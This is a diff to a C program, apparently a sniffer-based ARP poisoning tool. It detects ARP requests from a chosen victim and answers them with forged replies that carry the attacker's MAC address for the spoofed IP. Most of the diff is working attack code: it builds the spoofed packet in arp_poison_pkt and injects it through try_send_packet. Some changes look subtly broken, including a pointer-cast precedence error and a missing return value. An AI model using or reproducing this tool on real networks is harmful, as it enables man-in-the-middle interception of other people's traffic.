@@ -15,7 +15,8 @@
  *
  * =====================================================================================
  */
-
+#include <stdlib.h>
+#include <stdio.h>
 #include "packet_struct.h"
 #include <net/if_arp.h>
 #include "arp.h"
@@ -30,14 +31,14 @@ int arp_sent = 0;
 int arp_success = 0;
 
     void
-handle_arp (const struct pcap_pkthdr *h,const u_char * packet )
+handle_arp (const u_char * packet )
 {
     const struct pkt_arp * arp = (const struct pkt_arp *) (packet+ETH_SIZE);
     print_pkt_arp(arp);
     if (ntohs(arp->opcode) == ARPOP_REQUEST ) {
-        handle_arp_request(arp);
+        handle_arp_request(packet);
     } else if (ntohs(arp->opcode) == ARPOP_REPLY) {
-        handle_arp_reply(arp);
+        handle_arp_reply(packet);
     }
     return ;
 }		/* -----  end of function handle_arp  ----- */
@@ -49,23 +50,59 @@ handle_arp (const struct pcap_pkthdr *h,const u_char * packet )
  * can specify it in cmd line options. refer to options.)
  * 
  */
-void handle_arp_request(const struct pkt_arp * packet) {
-    if(is_router_packet(packet) == 0 || is_gratuitous_packet(packet) == 0 || is_broadcast_request(packet) == 0) {
+void handle_arp_request(const u_char * packet) {
+    const struct pkt_arp * arp = (const struct pkt_arp *) (packet+ETH_SIZE);
+
+    if(is_router_packet(arp) == 0 || is_gratuitous_packet(arp) == 0 || is_broadcast_request(arp) == 0) {
         return;
     }
-    if(is_from_victim(packet) == 0) { 
+    if(is_from_victim(arp) == 0) { 
         printf("Will launch an ARP Poison attack with this packet .. !\n");
-        arp_poison(packet);
+        arp_poison_pkt(packet);
     } else {
         printf("Packet not from victim. Discard.\n");
     }
 }
-int arp_poison_pkt(const struct pkt_arp * packet) {
-    
+
+/**
+ * Alternative method to inject ARP response packet */
+int arp_poison_pkt(const u_char * pkt) {
+   struct pkt_eth * eth;
+   struct pkt_arp * arp;
+   u_char * bytes = (u_char *) malloc(ARP_PACKET_SIZE);
+   u_short spoofed_ip[IP_ADDR_SIZE];
+   // cpy of the packet
+   memcpy(bytes,pkt,ARP_PACKET_SIZE);
+   eth = (struct pkt_eth *) bytes;
+   arp = (struct pkt_arp *) (bytes + ETH_SIZE); 
+   //print_pkt_eth(eth);
+   //print_pkt_arp(arp); 
+   
+   // cpy of the spooofed ip we gonna use
+   memcpy(spoofed_ip,arp->proto_addr_send,IP_ADDR_SIZE);
+
+   // set up eth frame MAC address
+   memcpy(eth->src,mac,ETH_ADDR_SIZE);
+   memcpy(eth->dest,arp->hard_addr_send,ETH_ADDR_SIZE);
+    // set up opcode
+   arp->opcode = htons(ARPOP_REPLY);
+   // set up MAC
+   memcpy(arp->hard_addr_dest,arp->hard_addr_send,ETH_ADDR_SIZE);
+   memcpy(arp->hard_addr_send,mac,ETH_ADDR_SIZE);
+   // set up IP
+   memcpy(arp->proto_addr_send,arp->proto_addr_dest,IP_ADDR_SIZE);
+   memcpy(arp->proto_addr_dest,spoofed_ip,IP_ADDR_SIZE);
+
+   //print_pkt_arp(arp); 
+   try_send_packet(bytes);
+
+   free(bytes);
+
 }
     int
-arp_poison (const struct pkt_arp * packet )
+arp_poison (const u_char * p )
 {
+    const struct pkt_arp * packet = (const struct pkt_arp *) p + ETH_SIZE;
     u_char  bytes[ARP_PACKET_SIZE];
     int offset = 0;
     //cpy dest mac address
@@ -101,21 +138,33 @@ arp_poison (const struct pkt_arp * packet )
     offset += ETH_ADDR_SIZE;
     // DEST ip addr, i.e. victim
     memcpy(bytes+offset,packet->proto_addr_send,IP_ADDR_SIZE);
-    offset += ETH_ADDR_SIZE;
+
+    try_send_packet(bytes);
+        return 0;
+}		/* -----  end of function arp_poison  ----- */
+
+/**
+ * Try to inject the packet
+ * update varisous stats
+ * */
+void try_send_packet(const u_char * bytes) {
+    int offset = 0;
+    pkt_eth * eth = (struct pkt_eth *) bytes;
+    pkt_arp * arp = (struct pkt_arp *) (bytes + ETH_SIZE); 
     for(offset=0;offset < 60;offset++) printf("x"); 
-    print_pkt_eth((const struct pkt_eth *) bytes);
-    print_pkt_arp((const struct pkt_arp * ) bytes+ETH_SIZE);  
+    printf("\n");
+    print_pkt_eth(eth);
+    print_pkt_arp(arp);  
     if ( 0 == send_packet(bytes,ARP_PACKET_SIZE)) {
         arp_success++;
     }
     arp_sent++;
     for(offset=0;offset<60;offset++) printf("x");
         
-    printf("Success : %d\tSent : %d\n",arp_success,arp_sent);
-    return ;
-}		/* -----  end of function arp_poison  ----- */
+    printf("\nSuccess : %d\tSent : %d\n",arp_success,arp_sent);
 
-void handle_arp_reply(const struct pkt_arp * packet) {
+}
+void handle_arp_reply(const u_char * bytes) {
     printf("Nothing to be done with ARP replies.\n");
 return;
 }
